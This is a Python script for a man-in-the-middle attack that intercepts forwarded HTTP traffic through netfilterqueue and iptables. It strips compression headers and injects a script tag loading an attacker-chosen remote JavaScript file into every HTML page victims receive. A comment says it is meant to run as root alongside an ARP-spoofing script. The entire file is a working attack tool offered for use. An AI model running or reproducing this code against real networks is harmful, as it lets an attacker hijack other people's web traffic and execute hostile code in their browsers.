#!/usr/bin/env python
############################# [ IMPORTS ] #############################

import netfilterqueue, re, os, argparse
from scapy.all import *

############################# [ VARIABLES ] #############################

ackList = []  # List of ack number in the whole NFQUEUE 

############################# [ FUNCTIONS ] #############################
# Handling the args
def getArgs():
    parser = argparse.ArgumentParser()  # Create an object to get args
    # Options of this program
    parser.add_argument("-U", "-u", "--url", dest="url", help="JS file URL to inject", type=str)
    parser.add_argument("-Q","-q", "--queue_num", dest="queue", help="Number of the queue to use", type=int)
    options = parser.parse_args()
    # print(parser.parse_args())
    if not options.url:  # Check if url is empty
        parser.error("\n[-] Please specify a url, use --help for more info.")
    else:
        try:  # Check if URL exists
            response = requests.head(options.url) 
        except requests.exceptions.RequestException:
            parser.error("\n[-] Please specify a valid url, use --help for more info.")

    if not options.queue:  # Check if queue number is empty
        parser.error("\n[-] Please specify a queue number to use, use --help for more info.")
        
    return options

# --------------------------------------------------
# Funtion to handle packet in the NFQUEUE
def handlePacket(packet):
    pkt = IP(packet.get_payload())  # Convert the packet to a scapy packet.

    if pkt.haslayer(Raw):  # Intercept only packet with HTTP layer with useful data
        try:
            payload = pkt[Raw].load.decode()
            if pkt[TCP].dport == 80:
                print("[+] Request")
                print("=======================================================================================================")
                payload = re.sub("Accept-Encoding:.*?\\r\\n", "", payload)  # Erase "Accept-Encoding" to get plain HTML in response

            elif pkt[TCP].sport == 80:
                print("[+] Response")
                print("=======================================================================================================")
                
                injectedCode = f'<script src="{options.url}"></script>'
                payload = payload.replace("</body>", f"{injectedCode}</body>")  # Put the injected code at the end of the page
                
                contentLengthSearch = re.search("(?:Content-Length:\s)(\d*)", payload)  # Search Content-Lenght
                if contentLengthSearch and "text/html" in payload:
                    contentLength = contentLengthSearch.group(1)  # Get the lenght
                    payload = payload.replace(contentLength, str(int(contentLength) + len(injectedCode)))

            if payload != pkt[Raw].load:  # Check if the payload had been modified
                pkt[Raw].load = payload

                # Make sure these fields do not corrupt packets (with 'del' it will recalculate them automatically)
                del pkt[IP].len
                del pkt[TCP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum

                pkt.set_payload(bytes(pkt))

        except UnicodeDecodeError:
            pass
    pkt.accept()

############################# [ LAUNCH ] #############################

# /!\ NEED to be run with ARP_Spoof.py and in root

# -------------------
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip3 install -U git+https://github.com/kti/python-netfilterqueue
# -------------------

options = getArgs()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, handlePacket)

try:
    #Check if user is root
    if not os.geteuid()==0:
        print('\n[-] This script must be run as root!')
        exit(1)
    else:
         subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)  # MITM 
         # subprocess.run(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)  # Current machine 
         # subprocess.run(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
        
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Exiting program ...")
    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
    # subprocess.run(f"sudo iptables -D OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
    exit()
    #time.sleep(0.052)
    #time.sleep(0.045)
